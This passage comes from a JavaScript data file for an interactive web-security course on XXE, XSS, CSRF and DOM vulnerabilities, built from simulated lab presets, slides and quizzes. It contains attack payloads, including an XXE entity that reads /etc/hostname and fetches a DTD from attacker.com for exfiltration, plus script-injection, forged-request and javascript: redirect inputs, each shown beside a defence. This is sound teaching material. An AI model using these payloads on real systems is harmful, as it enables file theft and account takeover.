          serverDevBefore: '// Parser encounters parameter entity with remote URI\nconst doc = parseXml(req.body);',
          serverInput: "%xxe; triggers HTTP GET to external listener",
          serverDevAfter: '// Server connects out to attacker DTD host',
          commentedOut: false,
          status: "200 OK · Out-of-Band DNS/HTTP Hit",
          statusType: "bypass",
          responsePreview: "Stock level: 89 (Out-of-band request recorded at collaborator)",
          aha: "Even when XML output is never reflected back in HTTP responses, parameter entities force the XML engine to reach across the internet to download DTDs, confirming blind XXE.",
          safeServerView: 'factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);',
          safeStatus: "200 OK · Remote DTD Blocked",
          safeAha: "Secure processing flags disallow loading remote DTD schemas over the network."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Client Submits Custom DTD in XML Payload",
        nodes: ["🌐 HTTP Client", "📡 XML Request", "⚙️ XML Parser", "📄 Server Filesystem"],
        activeNode: 0,
        packetText: "<!DOCTYPE ... SYSTEM ...>",
        body: "The application parses XML payloads for document uploads or API requests. The payload includes a Document Type Definition (DOCTYPE) defining a custom external entity.",
        takeaway: "Legacy XML standards allow documents to declare custom entity macros that reference external URIs."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "XML Parser Resolves Entity Using Local File URI",
        nodes: ["🌐 HTTP Client", "📡 XML Request", "⚙️ XML Parser", "📄 Server Filesystem"],
        activeNode: 2,
        packetText: "libxml resolves file:// URI",
        body: "The parser reads the DOCTYPE declaration before parsing the body elements. Because external entity resolution is enabled by default in many engines, the parser fetches the specified file.",
        takeaway: "Default XML parsers automatically dereference file://, http://, and ftp:// URIs."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Sensitive File Injected Into XML Data Nodes",
        nodes: ["🌐 HTTP Client", "📡 XML Request", "⚙️ XML Parser", "📄 Server Filesystem"],
        activeNode: 3,
        packetText: "File contents replace &xxe;",
        body: "The file contents are substituted into the XML element in place of the entity reference. When the application prints the element value or logs an error, the private file contents are revealed.",
        takeaway: "The data/content boundary collapsed when the parser treated external system resources as inline data."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Disable DTDs and External Entity Resolution",
        nodes: ["🌐 HTTP Client", "📡 XML Request", "⚙️ XML Parser", "📄 Server Filesystem"],
        activeNode: 2,
        packetText: "disallow-doctype-decl = true",
        body: "Configure your XML parser with disallow-doctype-decl set to true. Where DOCTYPEs cannot be disabled, turn off external-general-entities and external-parameter-entities explicitly.",
        takeaway: "Modern JSON APIs or hardened XML parser settings completely neutralize XXE vectors."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What happens when this XML document is parsed by a standard Java XML parser?",
      code: '<?xml version="1.0"?>\n<!DOCTYPE r [\n  <!ENTITY % data SYSTEM "file:///etc/hostname">\n  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">\n  %dtd;\n]><r>1</r>',
      options: [
        { text: "The parser crashes because parameter entities cannot be mixed with external DTDs.", correct: false, feedback: "Parameter entities (%name;) are specifically permitted inside the internal DTD subset to include external DTDs." },
        { text: "The parser requests the remote evil.dtd and executes its instructions to exfiltrate /etc/hostname.", correct: true, feedback: "Spot on! The parser fetches evil.dtd, which can construct a dynamic exfiltration URL containing the local file data." },
        { text: "The parser ignores all entities starting with '%' as formatting comments.", correct: false, feedback: "The '%' symbol defines XML parameter entities, which are fully evaluated by compliant DTD processors." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: The application accepts Content-Type: application/xml or text/xml in API endpoints.",
        mechanism: "⚙️ What It Means Under the Hood: A server-side XML parser (such as libxml2, Xerces, or DOMParser) is deserializing the input body.",
        nextMove: '🎯 How to Verify: Define a safe internal entity like <!ENTITY test "hello"> and reference &test; in a tag to test expansion.'
      },
      {
        clue: "👁️ What You Notice: The endpoint accepts JSON, but changing Content-Type to application/xml returns valid parsed results.",
        mechanism: "⚙️ What It Means Under the Hood: Frameworks like Spring Boot or Express with body-parser often auto-negotiate and parse XML bodies seamlessly.",
        nextMove: "🎯 How to Verify: Convert the JSON payload into XML equivalent and check if custom DOCTYPEs are processed."
      },
      {
        clue: "👁️ What You Notice: Submitting external entities returns an XML parsing error mentioning unknown entity or encoding issues.",
        mechanism: "⚙️ What It Means Under the Hood: The file contains binary data or illegal XML characters that broke the parser.",
        nextMove: "🎯 How to Verify: Wrap the file contents in a CDATA section or use PHP's php://filter/read=convert.base64-encode/resource=file wrapper."
      }
    ],
    quiz: [
      {
        q: "What is the single most effective defense against all XML External Entity (XXE) attacks?",
        options: [
          { text: "Disabling DOCTYPE declarations (disallow-doctype-decl) completely in the XML parser.", correct: true, why: "Correct! If the parser refuses to parse DOCTYPE declarations, entity definitions cannot be declared or expanded." },
          { text: "Validating that all XML tags are closed properly.", correct: false, why: "Well-formed XML can still contain fully valid, dangerous DOCTYPE and external entity definitions." }
        ]
      },
      {
        q: "Why do parameter entities (%name;) play a critical role in blind XXE attacks?",
        options: [
          { text: "They can be referenced inside external DTDs to dynamically construct outbound URLs holding leaked file data.", correct: true, why: "Exactly! Parameter entities allow dynamically interpolating file content into an HTTP URL for out-of-band exfiltration." },
          { text: "They bypass all network firewalls and TLS encryption.", correct: false, why: "Parameter entities do not modify transport layers; they expand strings within the DTD context." }
        ]
      }
    ]
  },

  'cross-site-scripting': {
    sandbox: {
      title: "Reflected & Stored XSS Lab",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Query / Search Input",
      presets: [
        {
          label: "1. Normal Search Query",
          input: "mechanical keyboard",
          http: "GET /search?q=mechanical+keyboard HTTP/1.1\nHost: target-shop.com",
          serverDevBefore: 'const q = req.query.q;\n// Server renders search result page template\nconst html = `<p>You searched for: `',
          serverInput: "<span>mechanical keyboard</span>",
          serverDevAfter: '`</p><div class="results">...</div>`;\nres.send(html);',
          commentedOut: false,
          status: "200 OK · Search Results Page",
          statusType: "normal",
          responsePreview: "You searched for: mechanical keyboard",
          aha: "The search query was reflected as plain text inside the HTML paragraph element, rendering harmlessly in the user's browser.",
          safeServerView: '// Server-side context-aware HTML entity encoding\nconst safe = escapeHtml(req.query.q); // replaces <, >, &, ", \'\nres.send(`<p>You searched for: ${safe}</p>`);',
          safeStatus: "200 OK · Encoded Output",
          safeAha: "Contextual encoding transforms raw HTML metacharacters into harmless character entities like &lt; and &gt;."
        },
        {
          label: "2. HTML Tag Probe",
          input: "<i>test</i>",
          http: "GET /search?q=%3Ci%3Etest%3C%2Fi%3E HTTP/1.1\nHost: target-shop.com",
          serverDevBefore: 'const q = req.query.q;\nconst html = `<p>You searched for: `',
          serverInput: "<i>test</i>",
          serverDevAfter: '`</p>`;\nres.send(html);',
          commentedOut: false,
          status: "200 OK · Italic Text Rendered",
          statusType: "normal",
          responsePreview: "You searched for: test (rendered in italics)",
          aha: "The browser rendered 'test' in italics instead of displaying the literal tags. This proves the server is reflecting unencoded user text into the DOM.",
          safeServerView: '<span>&lt;i&gt;test&lt;/i&gt;</span>',
          safeStatus: "200 OK · Text Only",
          safeAha: "Character entities prevent the browser's HTML parser from interpreting angle brackets as DOM elements."
        },
        {
          label: "3. Script Execution (alert(origin))",
          input: "<script>alert(document.domain)</script>",
          http: "GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\nHost: target-shop.com",
          serverDevBefore: '// Unescaped concatenation into HTML template\nconst html = `<p>Results for: `',
          serverInput: "<script>alert(document.domain)</script>",
          serverDevAfter: '`</p>`;\nres.send(html);',
          commentedOut: false,
          status: "200 OK · JavaScript Executed",
          statusType: "bypass",
          responsePreview: "[Alert Dialog Modal]: target-shop.com",
          aha: "The browser parsed the <script> tag and executed JavaScript in the application's security origin. The script has unrestricted access to cookies and authenticated actions.",
          safeServerView: '// Strict CSP header prevents inline script evaluation\nres.setHeader("Content-Security-Policy", "default-src \'self\'");',
          safeStatus: "200 OK · Inline Script Blocked by CSP",
          safeAha: "A strict Content Security Policy forbids execution of inline script tags and unhashed event handlers."
        },
        {
          label: "4. Attribute Breakout (<input>)",
          input: '" onfocus="alert(1)" autofocus="',
          http: 'GET /search?q=%22+onfocus%3D%22alert(1)%22+autofocus%3D%22 HTTP/1.1\nHost: target-shop.com',
          serverDevBefore: '// Reflected inside value attribute\nconst html = `<input type="text" name="q" value="`',
          serverInput: '" onfocus="alert(1)" autofocus="',
          serverDevAfter: '`">`;\nres.send(html);',
          commentedOut: false,
          status: "200 OK · Event Handler Fired",
          statusType: "bypass",
          responsePreview: '<input type="text" name="q" value="" onfocus="alert(1)" autofocus="">',
          aha: "The leading quote closed the value attribute, allowing the injected onfocus and autofocus attributes to execute code without using any angle brackets.",
          safeServerView: '<input type="text" value="&quot; onfocus=&quot;alert(1)...">',
          safeStatus: "200 OK · Safely Escaped Attribute",
          safeAha: "Attribute encoding translates double quotes into &quot;, keeping the input safely inside the value attribute."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Attacker Injects Markup Into Input Parameter",
        nodes: ["🌐 Victim Browser", "📡 HTTP Parameter", "⚙️ Server Template", "🖥️ Browser DOM"],
        activeNode: 0,
        packetText: "q=<script>alert(1)</script>",
        body: "An attacker crafts a URL containing markup characters and lures a victim into clicking it. The payload travels to the backend server inside query parameters or POST bodies.",
        takeaway: "User-controlled input enters the server without having been sanitized or encoded."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "Server Reflects Input Directly Into Response HTML",
        nodes: ["🌐 Victim Browser", "📡 HTTP Parameter", "⚙️ Server Template", "🖥️ Browser DOM"],
        activeNode: 2,
        packetText: "html = 'Results for: ' + q",
        body: "The application renders an HTML response page and interpolates the user input directly into the markup. The server does not perform contextual HTML entity encoding on dangerous characters.",
        takeaway: "The server fails to distinguish between developer template markup and untrusted user data."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Browser HTML Parser Executes Injected Script",
        nodes: ["🌐 Victim Browser", "📡 HTTP Parameter", "⚙️ Server Template", "🖥️ Browser DOM"],
        activeNode: 3,
        packetText: "Executes: alert(document.domain)",
        body: "The victim's browser receives the HTTP response and feeds it to its HTML parser. Finding an unescaped tag or event handler, the browser immediately runs the code inside the victim's session.",
        takeaway: "XSS executes in the security context of the victim's session, enabling session hijacking and account takeover."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Apply Contextual Encoding and Enforce Strict CSP",
        nodes: ["🌐 Victim Browser", "📡 HTTP Parameter", "⚙️ Server Template", "🖥️ Browser DOM"],
        activeNode: 3,
        packetText: "encodeHtml() + Strict CSP",
        body: "Encode dynamic values using context-appropriate rules (HTML body, attribute, JavaScript variable) before printing. Layer defenses with a strong Content Security Policy that bans inline scripts.",
        takeaway: "Context-aware output encoding stops the parser break; CSP prevents rogue execution if encoding fails."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What happens when the browser parses this HTML snippet?",
      code: '<script>\n  const user = "<b onmouseover=alert(1)>test</b>";\n  console.log(user);\n</script>',
      options: [
        { text: "The alert triggers immediately because onmouseover is inside a script tag.", correct: false, feedback: "Inside a JavaScript string literal, HTML tags are treated as character strings, not parsed DOM elements." },
        { text: "It logs the string to the console; no alert fires because the string is never injected into the DOM.", correct: true, feedback: "Spot on! The payload is enclosed inside a valid JavaScript string assignment and never interpreted by the HTML parser." },
        { text: "The browser throws a syntax error on the angle brackets.", correct: false, feedback: "Angle brackets are valid characters inside JavaScript string quotes." }
      ]
    },
    connections: [
      {
        clue: '👁️ What You Notice: Entering a probe like test"\'<div> in a field causes some characters to appear unchanged in the page source.',
        mechanism: "⚙️ What It Means Under the Hood: The application is reflecting user input without HTML entity encoding.",
        nextMove: "🎯 How to Verify: Determine the exact reflection context (inside tags, inside attributes, or inside a <script> block) to choose the right breakout syntax."
      },
      {
        clue: "👁️ What You Notice: The page reflects your payload, but your <script> tags do not execute and the console shows 'Refused to execute inline script'.",
        mechanism: "⚙️ What It Means Under the Hood: A Content Security Policy (CSP) header is active and blocking unsafe-inline execution.",
        nextMove: "🎯 How to Verify: Check the response headers for Content-Security-Policy to find allowed script endpoints, nonces, or CDN whitelists."
      },
      {
        clue: "👁️ What You Notice: A comment or bio you saved remains on the page even after a hard refresh and appears for other users.",
        mechanism: "⚙️ What It Means Under the Hood: You are looking at a Stored (Persistent) XSS vulnerability where the payload is retrieved from the database.",
        nextMove: "🎯 How to Verify: Test if harmless formatted tags like <b>bold</b> persist and render across separate incognito sessions."
      }
    ],
    quiz: [
      {
        q: "What is the critical distinction between Reflected XSS and Stored XSS?",
        options: [
          { text: "Reflected payloads travel immediately in a single request-response cycle, while Stored payloads are saved in the database and served to future visitors.", correct: true, why: "Correct! Stored XSS persists on the server and targets any user viewing the contaminated page." },
          { text: "Reflected XSS executes in the browser, while Stored XSS executes on the server operating system.", correct: false, why: "Both forms of XSS execute entirely inside the victim's client-side browser." }
        ]
      },
      {
        q: "Why is context-aware encoding necessary instead of just replacing < and >?",
        options: [
          { text: "Inputs reflected inside HTML attributes, event handlers, or href links can execute code without using any angle brackets.", correct: true, why: "Exactly! An attribute like value=\"\" onfocus=\"alert(1)\" needs double-quote escaping, not just angle-bracket filtering." },
          { text: "Angle brackets are only dangerous in older versions of Internet Explorer.", correct: false, why: "Angle brackets define tags in all HTML parsers across all browsers." }
        ]
      }
    ]
  },

  'cross-site-request-forgery-csrf': {
    sandbox: {
      title: "Cross-Site Request Forgery (CSRF) Simulator",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Cross-Site Action Payload",
      presets: [
        {
          label: "1. Legitimate Same-Site Submit",
          input: "email=user@example.com",
          http: "POST /my-account/change-email HTTP/1.1\nHost: my-bank.com\nCookie: session=xyz123\nContent-Type: application/x-www-form-urlencoded\n\nemail=user@example.com&csrf_token=valid_token",
          serverDevBefore: '// Validate user session and anti-CSRF token\nconst user = verifySession(req.cookies.session);\nif (req.body.csrf_token !== user.expectedToken) throw new Error();',
          serverInput: "email: 'user@example.com', csrf_token: 'valid_token'",
          serverDevAfter: 'user.email = req.body.email;\nres.send("Email updated successfully.");',
          commentedOut: false,
          status: "200 OK · Email Updated",
          statusType: "normal",
          responsePreview: "Your profile email has been updated to user@example.com",
          aha: "The user submitted the form directly from my-bank.com. Both the session cookie and the unpredictable anti-CSRF token matched the server's records.",
          safeServerView: '// Anti-CSRF token validated successfully\nassertValidCsrfToken(req.body.csrf_token, user.sessionToken);',
          safeStatus: "200 OK · Token Matched",
          safeAha: "Validating an unpredictable, session-bound anti-CSRF token guarantees the request was initiated by the genuine site UI."
        },
        {
          label: "2. Missing Token Probe",
          input: "email=probe@test.com",
          http: "POST /my-account/change-email HTTP/1.1\nHost: my-bank.com\nCookie: session=xyz123\nContent-Type: application/x-www-form-urlencoded\n\nemail=probe@test.com",
          serverDevBefore: '// Flawed server check: only validates token if present!\nif (req.body.csrf_token) {\n  assertTokenValid(req.body.csrf_token);\n}',
          serverInput: "email: 'probe@test.com' (no csrf_token provided)",
          serverDevAfter: '// Token check bypassed because parameter was omitted!\nuser.email = req.body.email;\nres.send("Email updated.");',
          commentedOut: false,
          status: "200 OK · Email Updated Without Token",
          statusType: "bypass",
          responsePreview: "Your profile email has been updated to probe@test.com",
          aha: "The developer only validated the token when it was included in the request body. Omitting the parameter completely bypassed the security check.",
          safeServerView: '// Mandatory token check: rejects request if token is absent\nif (!req.body.csrf_token || !isValid(req.body.csrf_token)) return res.status(403);',
          safeStatus: "403 Forbidden · Missing Anti-CSRF Token",
          safeAha: "Defenses must require tokens unconditionally for all state-changing HTTP methods."
        },
        {
          label: "3. Attacker Auto-Submit Form",
          input: "Attacker site evil.com triggers POST to my-bank.com",
          http: "POST /my-account/change-email HTTP/1.1\nHost: my-bank.com\nOrigin: https://evil.com\nCookie: session=xyz123\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker@evil.com",
          serverDevBefore: '// Victim browser auto-sends ambient session cookie!\nconst user = getUserBySession(req.cookies.session);',
          serverInput: "email: 'attacker@evil.com' with victim's session cookie",
          serverDevAfter: "user.email = 'attacker@evil.com'; // Password reset hijacked!\nres.send('Email updated.');",
          commentedOut: false,
          status: "200 OK · Account Hijacked via CSRF",
          statusType: "bypass",
          responsePreview: "Email address changed to attacker@evil.com.",
          aha: "When the victim loaded evil.com, a hidden form auto-submitted to my-bank.com. The browser dutifully attached the victim's session cookies, changing the email without their knowledge.",
          safeServerView: '// SameSite=Lax prevents cross-site POSTs from sending cookies\nSet-Cookie: session=xyz123; SameSite=Lax; Secure; HttpOnly;',
          safeStatus: "401 Unauthorized · Cookie Omitted on Cross-Site POST",
          safeAha: "SameSite=Lax cookies are withheld by modern browsers during cross-site POST form submissions."
        },
        {
          label: "4. Method Override to GET",
          input: "GET /my-account/change-email?email=attacker@evil.com",
          http: "GET /my-account/change-email?email=attacker@evil.com HTTP/1.1\nHost: my-bank.com\nCookie: session=xyz123",
          serverDevBefore: '// App handles both GET and POST with the same routing handler\nconst email = req.body.email || req.query.email;',
          serverInput: "Query: email=attacker@evil.com (sent via <img> tag)",
          serverDevAfter: 'user.email = email;\nres.send("Email updated.");',
          commentedOut: false,
          status: "200 OK · Hijacked via Simple <img> Tag",
          statusType: "bypass",
          responsePreview: "Email updated via GET request.",
          aha: "Because the server accepted state changes via GET, the attacker didn't even need JavaScript—a simple <img src=\"...\"> tag on an external forum triggered the exploit.",
          safeServerView: '// State-changing operations must require idempotent GET / strict POST\nif (req.method !== "POST") return res.status(405);',
          safeStatus: "405 Method Not Allowed",
          safeAha: "Enforcing strict HTTP method checks prevents passive image loads and links from mutating account state."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Attacker Hosts a Hidden Form on Malicious Site",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 Bank Server", "🗄️ User Account"],
        activeNode: 0,
        packetText: "<form action='https://bank...'>",
        body: "The attacker hosts a page on evil.com with an invisible HTML form targeting the bank's account update URL. The form is pre-filled with the attacker's email and set to submit automatically via JavaScript.",
        takeaway: "Browsers allow websites to submit forms to entirely different origins by design."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Browser Action",
        headline: "Victim's Browser Automatically Attaches Cookies",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 Bank Server", "🗄️ User Account"],
        activeNode: 1,
        packetText: "Auto-attaches session cookie",
        body: "The victim visits the attacker's page while currently logged in to the bank. When the cross-origin form fires, the browser automatically attaches all relevant cookies for my-bank.com.",
        takeaway: "Ambient credentials (cookies) are sent automatically unless blocked by SameSite attributes."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Bank Server Processes Request as Legitimate",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 Bank Server", "🗄️ User Account"],
        activeNode: 2,
        packetText: "Updates email without token",
        body: "The bank receives the request along with the victim's valid session cookie. Because the form has no unpredictable token to verify, the server assumes the legitimate user intended the action.",
        takeaway: "The server failed to verify the user's intent, only their authenticated identity."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Implement SameSite Cookies and CSRF Tokens",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 Bank Server", "🗄️ User Account"],
        activeNode: 2,
        packetText: "SameSite=Strict + CSRF Token",
        body: "Mark session cookies with SameSite=Lax or SameSite=Strict to block ambient cookie transmission on cross-site requests. Add unique, cryptographically random anti-CSRF tokens to all mutating forms.",
        takeaway: "Dual defense using SameSite cookies and cryptographically bound tokens eliminates CSRF."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What happens if an attacker tries CSRF against an API expecting 'Content-Type: application/json'?",
      code: '<form action="https://bank.com/api/transfer" method="POST">\n  <input name=\'{"amount":100,"to":"attacker"}\' value=\'\'>\n</form>',
      options: [
        { text: "The browser sends Content-Type: application/json automatically.", correct: false, feedback: "Standard HTML forms can only send application/x-www-form-urlencoded, multipart/form-data, or text/plain." },
        { text: "The server rejects it because the browser sends Content-Type: application/x-www-form-urlencoded.", correct: true, feedback: "Spot on! HTML forms cannot emit application/json, and fetch/XHR requires a CORS preflight that blocks unauthorized origins." },
        { text: "The transfer succeeds because the backend parses JSON regardless of header.", correct: false, feedback: "Standard body parsers verify Content-Type before parsing JSON payloads." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: An account settings form contains no hidden input field for a CSRF token.",
        mechanism: "⚙️ What It Means Under the Hood: The application relies entirely on cookie authentication without explicit action confirmation.",
        nextMove: "🎯 How to Verify: Generate a standalone HTML file with an auto-submitting form targeting the endpoint to test cross-origin execution."
      },
      {
        clue: "👁️ What You Notice: The application issues a CSRF token, but modifying a single character causes a 403, while deleting the parameter succeeds.",
        mechanism: "⚙️ What It Means Under the Hood: The backend code checks token validity conditionally (if token present) rather than enforcing presence.",
        nextMove: "🎯 How to Verify: Send a POST request with the token parameter completely stripped or replaced by an empty string."
      },
      {
        clue: "👁️ What You Notice: Inspecting the Set-Cookie response header shows no SameSite attribute specified.",
        mechanism: "⚙️ What It Means Under the Hood: While modern Chrome defaults cookies to Lax after 2 minutes, older browsers or non-POST navigations still expose endpoints to CSRF.",
        nextMove: "🎯 How to Verify: Check if the action can be triggered via GET requests or test across multiple browser engines."
      }
    ],
    quiz: [
      {
        q: "Why doesn't the browser's Same-Origin Policy (SOP) automatically prevent CSRF attacks?",
        options: [
          { text: "The SOP restricts reading the response of cross-origin requests, but allows cross-origin requests to be sent.", correct: true, why: "Correct! The SOP stops evil.com from reading your bank balance, but does not stop it from submitting a form to transfer money." },
          { text: "The SOP only applies to HTTPS websites, not plain HTTP.", correct: false, why: "SOP governs all web origins across both HTTP and HTTPS." }
        ]
      },
      {
        q: "How does the 'SameSite=Strict' cookie attribute prevent CSRF?",
        options: [
          { text: "It instructs the browser never to send the cookie on any cross-site request, even when following external links.", correct: true, why: "Exactly! In Strict mode, cookies are only attached when the request originated from the exact same site." },
          { text: "It encrypts the cookie using the client's public key.", correct: false, why: "SameSite is a browser routing policy, not a cryptographic encryption mechanism." }
        ]
      }
    ]
  },

  'dom-based-vulnerabilities': {
    sandbox: {
      title: "DOM-Based Vulnerability Laboratory",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "URL Fragment / Location Source",
      presets: [
        {
          label: "1. Normal Hash Navigation",
          input: "#welcome",
          http: "GET /dashboard#welcome HTTP/1.1\nHost: app.site.com",
          serverDevBefore: '// Server never sees the hash (#welcome)!\nres.sendFile("dashboard.html");\n// Browser JavaScript runs locally:',
          serverInput: "const section = location.hash.slice(1); // 'welcome'",
          serverDevAfter: 'document.getElementById(section).scrollIntoView();',
          commentedOut: false,
          status: "200 OK · Navigated to Section",
          statusType: "normal",
          responsePreview: "View scrolled to <section id='welcome'>",
          aha: "The hash string was processed strictly by browser JavaScript to adjust the scroll position. Notice the server never even received the '#welcome' fragment in HTTP logs.",
          safeServerView: '// Safe DOM lookup without innerHTML\nconst el = document.getElementById(safeSection);\nif (el) el.scrollIntoView();',
          safeStatus: "200 OK · Safe DOM Lookup",
          safeAha: "Using element lookups and text properties avoids dangerous HTML interpretation."
        },
        {
          label: "2. HTML Source-to-Sink Probe",
          input: "#<b>bold</b>",
          http: "GET /dashboard#%3Cb%3Ebold%3C%2Fb%3E HTTP/1.1\nHost: app.site.com",
          serverDevBefore: '// Client script takes location.hash directly:\nconst query = decodeURIComponent(location.hash.slice(1));',
          serverInput: "query = '<b>bold</b>'",
          serverDevAfter: 'document.getElementById("status").innerHTML = query;',
          commentedOut: false,
          status: "Client-Side Render · Bold Text",
          statusType: "normal",
          responsePreview: "Status: bold (rendered in bold typeface)",
          aha: "The string in the URL hash was written into innerHTML, causing the browser to render bold text. This proves that an untrusted DOM source directly reaches an execution sink.",
          safeServerView: '// Safe sink: textContent never parses tags\ndocument.getElementById("status").textContent = query;',
          safeStatus: "Client-Side Render · Plain Text",
          safeAha: "textContent treats all input strictly as a literal text node, defusing HTML parsing."
        },
        {
          label: "3. DOM XSS (<img onerror>)",
          input: "#<img src=x onerror=alert(document.domain)>",
          http: "GET /dashboard#%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E HTTP/1.1\nHost: app.site.com",
          serverDevBefore: '// Dangerous sink: innerHTML parses HTML tags dynamically\nconst payload = decodeURIComponent(location.hash.slice(1));',
          serverInput: "innerHTML = '<img src=x onerror=alert(document.domain)>'",
          serverDevAfter: '// Browser parses <img>, triggers onerror immediately!\nalert(document.domain);',
          commentedOut: false,
          status: "Client-Side Break · Script Executed",
          statusType: "bypass",
          responsePreview: "[Alert Dialog]: app.site.com",
          aha: "Setting innerHTML caused the browser to create an image element. When the fake source 'x' failed to load, the inline onerror handler executed within the origin.",
          safeServerView: '// Sanitize with DOMPurify before assigning to innerHTML\ndiv.innerHTML = DOMPurify.sanitize(payload);',
          safeStatus: "Client-Side Render · Sanitized",
          safeAha: "DOMPurify strips event handlers and hazardous markup while preserving harmless styling."
        },
        {
          label: "4. DOM Open Redirect",
          input: "?redirect=javascript:alert(1)",
          http: "GET /login?redirect=javascript:alert(1) HTTP/1.1\nHost: app.site.com",
          serverDevBefore: '// JavaScript reads search parameter and assigns to location.href\nconst target = new URLSearchParams(location.search).get("redirect");',
          serverInput: "location.href = 'javascript:alert(1)'",
          serverDevAfter: 'location.href = target; // Browser executes javascript pseudo-scheme',
          commentedOut: false,
          status: "Client-Side Break · Scheme Executed",
          statusType: "bypass",
          responsePreview: "URL redirected to javascript: pseudo-protocol.",
          aha: "Assigning to location.href using a 'javascript:' URL executes code directly in the page origin. Sinks include navigation targets as well as HTML injection.",
          safeServerView: '// Validate relative path or allowlisted origin\nif (target.startsWith("/") && !target.startsWith("//")) location.href = target;',
          safeStatus: "Client-Side Block · Invalid Redirect",
          safeAha: "Ensuring redirect targets are strictly relative paths prevents pseudo-protocol code execution."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "User Input Stored in Client-Side Source",
        nodes: ["🌐 URL Source", "⚙️ Client JS Engine", "🗄️ DOM Tree", "💥 Execution Sink"],
        activeNode: 0,
        packetText: "location.hash -> payload",
        body: "The attacker feeds malicious data into a client-side source like location.hash, location.search, or window.name. The server often never sees this fragment because browsers strip hashes from HTTP requests.",
        takeaway: "DOM vulnerabilities can exist and execute without any server-side involvement."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Browser Action",
        headline: "Client-Side JavaScript Reads Source Data",
        nodes: ["🌐 URL Source", "⚙️ Client JS Engine", "🗄️ DOM Tree", "💥 Execution Sink"],
        activeNode: 1,
        packetText: "Reads location.hash",
        body: "A client-side script reads the source variable and processes it through string manipulators. The developer intended to dynamically update a tab, render a preview, or navigate to a section.",
        takeaway: "The vulnerability originates inside frontend JavaScript code, not backend server handlers."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Data Flow Reaches a Dangerous Execution Sink",
        nodes: ["🌐 URL Source", "⚙️ Client JS Engine", "🗄️ DOM Tree", "💥 Execution Sink"],
        activeNode: 3,
        packetText: "innerHTML / location.href",
        body: "The script hands the untrusted data directly to a dangerous execution sink like innerHTML, document.write(), eval(), or location.href. The browser executes the payload as code.",
        takeaway: "DOM XSS occurs whenever an untrusted source flows into a dangerous execution sink."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Switch to Safe DOM APIs and Sanitize Sinks",
        nodes: ["🌐 URL Source", "⚙️ Client JS Engine", "🗄️ DOM Tree", "💥 Execution Sink"],
        activeNode: 3,
        packetText: "textContent / DOMPurify",
        body: "Replace dangerous sinks like innerHTML with safe alternatives such as textContent or createElement. When HTML markup must be supported, sanitize the input using trusted libraries like DOMPurify.",
        takeaway: "Prefer safe DOM setters and sanitize all dynamic markup at the point of insertion."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: Which line contains the dangerous DOM sink?",
      code: '1: const params = new URLSearchParams(window.location.search);\n2: const role = params.get("role");\n3: const badge = document.createElement("span");\n4: badge.innerHTML = "Role: " + role;\n5: document.body.appendChild(badge);',
      options: [
        { text: "Line 1 (new URLSearchParams)", correct: false, feedback: "URLSearchParams is a source reading the query string, not an execution sink." },
        { text: "Line 4 (badge.innerHTML)", correct: true, feedback: "Spot on! Assigning untrusted input into innerHTML parses and executes dynamic HTML/scripts." },
        { text: "Line 5 (appendChild)", correct: false, feedback: "appendChild merely inserts the existing DOM node; the parsing happened at line 4." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: The page reflects a URL hash or search parameter, but viewing the raw HTML source (Ctrl+U) does not show your text.",
        mechanism: "⚙️ What It Means Under the Hood: The reflection is generated entirely by client-side JavaScript modifying the DOM after load.",
        nextMove: "🎯 How to Verify: Open DevTools Elements tab or set an XHR/DOM breakpoint in the Sources panel to track which script modified the element."
      },
      {
        clue: "👁️ What You Notice: The application listens to window.addEventListener('message', ...) without validating event.origin.",
        mechanism: "⚙️ What It Means Under the Hood: Web messaging (postMessage) is being used as a source that any external site can send messages to.",
        nextMove: "🎯 How to Verify: From an iframe or console, call targetWindow.postMessage(payload, '*') and observe if the listener processes it."
      },
      {
        clue: "👁️ What You Notice: A third-party jQuery library (e.g., $(location.hash)) is used to select elements on page load.",
        mechanism: "⚙️ What It Means Under the Hood: Older jQuery versions treated selectors starting with '<' as HTML element creators rather than DOM queries.",
        nextMove: "🎯 How to Verify: Append #<img src=x onerror=alert(1)> to the URL to test if the jQuery selector executes it."
      }
    ],
    quiz: [
      {
        q: "What is the difference between a DOM 'source' and a DOM 'sink'?",
